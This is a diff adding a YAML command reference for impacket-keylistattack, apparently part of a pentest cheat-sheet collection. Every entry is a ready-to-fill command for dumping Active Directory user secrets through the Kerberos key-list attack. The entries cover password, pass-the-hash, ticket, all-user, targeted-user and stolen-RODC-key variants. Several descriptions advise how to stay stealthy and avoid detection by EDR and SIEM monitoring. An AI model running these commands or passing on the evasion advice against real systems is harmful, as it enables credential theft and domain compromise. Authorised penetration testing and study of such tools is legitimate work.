@@ -1,0 +1,78 @@
+tool: impacket-keylistattack
+tags: [pentest, security, active-directory, kerberos, impacket, exploitation, enumeration]
+
+actions:
+  # === BASIC AUTHENTICATION SCENARIOS ===
+  - title: impacket-keylistattack - basic attack with password
+    desc: |
+      Performs the KERB-KEY-LIST-REQ attack using cleartext credentials against a specific KDC.
+      This command is the most direct way to attempt secret dumping when you have a valid set of user credentials.
+      It communicates with the Key Distribution Center to request key lists without needing to execute code on the target machine.
+      Ensure the target user has sufficient privileges to perform the requested actions or list domain objects.
+    command: "impacket-keylistattack {{domain}}/{{username}}:{{password}}@{{kdc_host}}"
+
+  - title: impacket-keylistattack - authentication using NTLM hashes
+    desc: |
+      Executes the attack by authenticating with NTLM hashes instead of a plain password.
+      This is particularly useful in Pass-the-Hash scenarios where cleartext passwords are not available.
+      The tool will use the provided hashes to authenticate to SMB and proceed with the Kerberos key list request.
+      Format the hashes as LMHASH:NTHASH, typically leaving the LM part empty if unknown.
+    command: "impacket-keylistattack -hashes {{hash}} {{domain}}/{{username}}@{{kdc_host}}"
+
+  - title: impacket-keylistattack - authentication using Kerberos ticket
+    desc: |
+      Uses an existing Kerberos ticket (ccache file) for authentication to perform the attack.
+      This method is more stealthy as it avoids sending NTLM authentication over the network.
+      You must have a valid KRB5CCNAME environment variable pointing to your ticket file before running this.
+      The -no-pass flag ensures the tool does not prompt for a password during the execution.
+    command: "impacket-keylistattack -k -no-pass {{domain}}/{{username}}@{{kdc_host}}"
+
+  # === ENUMERATION & TARGETING ===
+  - title: impacket-keylistattack - attack all domain users
+    desc: |
+      Attempts to run the KERB-KEY-LIST-REQ attack against every user found in the domain.
+      This is a highly aggressive and noisy operation that is likely to be flagged by EDR or SIEM solutions.
+      It may also lead to a high volume of TGS requests, which could cause the KDC to reject subsequent requests.
+      Use this only when a full dump is required and noise is not a primary concern.
+    command: "impacket-keylistattack -full {{domain}}/{{username}}:{{password}}@{{kdc_host}}"
+
+  - title: impacket-keylistattack - target specific users from a file
+    desc: |
+      Reads a list of target usernames from a text file and performs the attack only on those accounts.
+      This approach is much more surgical than a full scan and helps stay under the radar of security monitoring.
+      When using the LIST option, you must explicitly provide the domain and KDC parameters.
+      The input file should contain one username per line.
+    command: "impacket-keylistattack -tf {{user_list_file}} -domain {{domain}} -kdc {{kdc_host}} {{domain}}/{{username}}:{{password}}@{{kdc_host}}"
+
+  - title: impacket-keylistattack - target a single specific user
+    desc: |
+      Focuses the attack on one specific username provided via the -t parameter.
+      This is useful when you have identified a high-value target and want to retrieve their secrets specifically.
+      Like other LIST options, this requires the domain and KDC hostname to be specified separately.
+      It minimizes network traffic and reduces the risk of account lockouts or detection.
+    command: "impacket-keylistattack -t {{target_username}} -domain {{domain}} -kdc {{kdc_host}} {{domain}}/{{username}}:{{password}}@{{kdc_host}}"
+
+  # === SPECIALIZED CONFIGURATIONS ===
+  - title: impacket-keylistattack - RODC specific attack
+    desc: |
+      Performs the attack by leveraging Read-Only Domain Controller (RODC) credentials.
+      You must provide the RODC account number and the corresponding AES key for the krbtgt account.
+      This is specifically designed for environments where RODCs are deployed and you have compromised the RODC keys.
+      The RODC key is essential for decrypting the key list responses provided by the KDC.
+    command: "impacket-keylistattack -rodcNo {{rodc_number}} -rodcKey {{rodc_aes_key}} {{domain}}/{{username}}:{{password}}@{{kdc_host}}"
+
+  - title: impacket-keylistattack - specify target IP address
+    desc: |
+      Forces the connection to a specific target IP address, bypassing DNS resolution for the NetBIOS name.
+      This is helpful when the target KDC hostname cannot be resolved through standard means or in complex network segments.
+      It ensures the packets are routed to the correct host while still using the appropriate domain context.
+      Use this when you encounter 'Host not found' errors despite the target being reachable via IP.
+    command: "impacket-keylistattack -target-ip {{target_ip}} {{domain}}/{{username}}:{{password}}@{{kdc_host}}"
+
+  - title: impacket-keylistattack - debug and timestamped output
+    desc: |
+      Runs the attack with full debug output and adds timestamps to every log entry.
+      This is crucial for troubleshooting connection issues or understanding why an attack failed (e.g., KDC errors).
+      The timestamps help correlate the tool's actions with logs on the domain controller or other monitoring tools.
+      Debug mode reveals the underlying Kerberos structures and responses being processed.
+    command: "impacket-keylistattack -debug -ts {{domain}}/{{username}}:{{password}}@{{kdc_host}}"
